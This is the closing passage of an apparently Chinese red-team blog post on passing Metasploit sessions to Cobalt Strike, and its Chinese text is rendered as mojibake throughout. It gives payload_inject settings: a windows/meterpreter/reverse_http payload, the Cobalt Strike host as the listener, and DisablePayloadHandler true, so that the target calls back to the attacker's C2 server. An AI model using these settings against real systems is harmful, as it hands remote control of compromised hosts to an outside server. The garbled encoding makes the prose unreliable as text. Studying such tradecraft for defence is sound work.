run</span></pre></td></tr></table></figure><p>è§£é‡Šä¸€ä¸‹è¿™äº›å‚æ•°ã€‚ç”±äºCobaltStrikeçš„ç›‘å¬å™¨æˆ‘ä»¬ä½¿ç”¨çš„æ˜¯ï¼š</p><p><code>windows/beacon_http/reverse_http</code></p><p>æ‰€ä»¥æˆ‘ä»¬çš„payloadä¹Ÿè¦ä½¿ç”¨ï¼š</p><p><code>payload windows/meterpreter/reverse_http</code></p><p>è®¾ç½®æœ¬åœ°ç›‘å¬IPå’Œç«¯å£ï¼šç”±äºç›‘å¬å™¨æ˜¯CobaltStrikeçš„ï¼Œæ‰€ä»¥è¦<strong>è®¾ç½®æˆCobaltStrikeæœºå™¨çš„IPä¸ç«¯å£ã€‚</strong></p><p>é»˜è®¤æƒ…å†µä¸‹ï¼Œpayload_injectæ‰§è¡Œä¹‹åä¼šåœ¨æœ¬åœ°äº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œç”±äºæˆ‘ä»¬å·²ç»æœ‰äº†ä¸€ä¸ªï¼Œæ‰€ä»¥ä¸éœ€è¦åœ¨äº§ç”Ÿä¸€ä¸ªï¼Œè¿™é‡Œæˆ‘ä»¬è®¾ç½®ï¼š</p><p><code>set DisablePayloadHandler true</code></p><p>è®¾ç½®å½“å‰çš„sessionï¼Œæ‰§è¡Œrunã€‚</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101342.jpg" alt="image-20191021160652347"></p><p>æ­¤æ—¶ç›®æ ‡æœºä¾¿å·²æˆåŠŸä»CobaltStrikeä¸Šçº¿ã€‚</p><p><img src="http://img.payloads.cn/blog/2019-12-04-101341.jpg" alt="image-20191021160701228"></p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å…³äºCobalStrikeä¸Metasploit çš„è”åŠ¨åˆ©ç”¨æ–¹å¼è¿œä¸æ­¢è¿™äº›ï¼Œæ¯ç§æ–¹å¼åœ¨å®æˆ˜ä¸­éƒ½æœ‰å¯¹åº”çš„åº”ç”¨åœºæ™¯ï¼Œæ›´éœ€è¦æ¢ç´¢ä¸æ€»ç»“ã€‚</p><p><strong>åç»­æ–‡ç« ä¼šè®²è§£ åˆ©ç”¨CobalStrikeæ‰¹é‡ä¸Šçº¿Beacon shellçš„ä¸åŒæ–¹å¼ã€‚ï¼ˆç›®æ ‡å†…ç½‘ä¸»æœºå‡ºç½‘ä¸ä¸å‡ºç½‘çš„åˆ©ç”¨ï¼‰</strong></p></div><div class="article-footer"><blockquote class="mt-2x"><ul class="post-copyright list-unstyled"><li class="post-copyright-link hidden-xs"><strong>æœ¬æ–‡é“¾æ¥ï¼š</strong> <a href="https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html" title="CobaltStrikeä¸Metasploitå®æˆ˜è”åŠ¨" target="_blank" rel="external">https://payloads.cn/2019/1211/cobaltstrike-and-metasploit-combat-linkage.html</a></li><li class="post-copyright-license"><strong>ç‰ˆæƒå£°æ˜ï¼š </strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« å‡é‡‡ç”¨ <a href="http://creativecommons.org/licenses/by/4.0/deed.zh" target="_blank" rel="external">CC BY 4.0 CNåè®®</a> è®¸å¯åè®®ã€‚è½¬è½½è¯·æ³¨æ˜å‡ºå¤„ï¼</li><li class="post-copyright-license"><strong>ç‰¹åˆ«å£°æ˜ï¼š </strong>æœ¬åšå®¢æ‰€æœ‰æ–‡ç« ä»…ä¾›å®‰å…¨å­¦ä¹ ç ”ç©¶ä¹‹ç”¨ï¼Œä¸¥ç¦ç”¨äºä»»ä½•éæ³•ç”¨é€”ã€‚è‹¥äº§ç”Ÿä»»ä½•æ³•å¾‹é—®é¢˜ï¼Œå‡ç”±è¯»è€…è‡ªè¡Œæ‰¿æ‹…ï¼</li></ul></blockquote><div class="panel panel-default panel-badger"><div class="panel-body"><figure class="media"><div class="media-left"><a href="https://github.com/An0nySec/" target="_blank" class="img-burn thumb-sm visible-lg"><img src="/images/avatar.jpg" class="img-rounded w-full" alt=""></a></div><div class="media-body"><h3 class="media-heading"><a href="https://github.com/An0nySec/" target="_blank"><span class="text-dark">AnonySec</span><small class="ml-1x"></small></a></h3><div>å›å­è—å™¨äºèº«å¾…æ—¶è€ŒåŠ¨ï¼Œå®‰å…¨ä¸éœ²åœ­è§’è¦†ç›‚ä¹‹å®‰ã€‚</div></div></figure></div></div></div></article><section id="comments"><div id="vcomments"></div></section></div><nav class="bar bar-footer clearfix" data-stick-bottom><div class="bar-inner"><ul class="pager pull-left"><li class="next"><a href="/2019/1209/basic-use-of-office-macros.html" title="Officeå®çš„åŸºæœ¬åˆ©ç”¨"><span>ä¸‹ä¸€ç¯‡&nbsp;&nbsp;</span><i class="icon icon-angle-right" aria-hidden="true"></i></a></li><li class="toggle-toc"><a class="toggle-btn collapsed" data-toggle="collapse" href="#collapseToc" aria-expanded="false" title="æ–‡ç« ç›®å½•" role="button"><span>[&nbsp;</span><span>æ–‡ç« ç›®å½•</span> <i class="text-collapsed icon icon-anchor"></i> <i class="text-in icon icon-close"></i> <span>]</span></a></li></ul><div class="bar-right"><div class="share-component" data-sites="wechat,qq,weibo,facebook,twitter" data-mobile-sites="wechat,qq,weibo"></div></div></div></nav></main><footer class="footer" itemscope itemtype="http://schema.org/WPFooter"><ul class="social-links"><li><a href="https://github.com/An0nySec/" target="_blank" title="Github" data-toggle="tooltip" data-placement="top"><i class="icon icon-github"></i></a></li><li><a href="/atom.xml" target="_blank" title="Rss" data-toggle="tooltip" data-placement="top"><i class="icon icon-rss"></i></a></li></ul><div class="copyright">&copy; 2019 AnonySec<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><br><span id="busuanzi_container_site_pv">æœ¬ç«™æ€»è®¿é—®é‡<span id="busuanzi_value_site_pv"></span>æ¬¡</span></div></footer><script src="//cdn.jsdelivr.net/npm/jquery@1.12.4/dist/jquery.min.js"></script><script>window.jQuery||document.write('<script src="js/jquery.min.js"><\/script>')</script><script src="/js/plugin.min.js"></script><script src="/js/application.js"></script><script>!function(T){var N={TRANSLATION:{POSTS:"æ–‡ç« ",PAGES:"é¡µé¢",CATEGORIES:"åˆ†ç±»",TAGS:"æ ‡ç­¾",UNTITLED:"(æœªå‘½å)"},ROOT_URL:"/",CONTENT_URL:"/content.json"};T.INSIGHT_CONFIG=N}(window)</script><script src="/js/insight.js"></script><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="//cdn.jsdelivr.net/npm/valine"></script><script type="text/javascript">var GUEST=["nick","mail","link"],meta="nick,mail,link";meta=meta.split(",").filter(function(e){return GUEST.indexOf(e)>-1}),new Valine({el:"#vcomments",verify:!0,notify:!0,appId:"Bjzze7tMeU49R7p3wkntmF7P-9Nh9j0Va",appKey:"BPyUhtiOM24L21THkVh7xU56",placeholder:"Just go go",avatar:"mm",meta:meta,pageSize:"10",visitor:!1})</script><script defer>var _hmt=_hmt||[];!function(){var e=document.createElement("script");e.src="//hm.baidu.com/hm.js?e880bcd23afb06b01821a88e7070b35a";var t=document.getElementsByTagName("script")[0];t.parentNode.insertBefore(e,t)}()</script></body></html><!-- rebuild by neat -->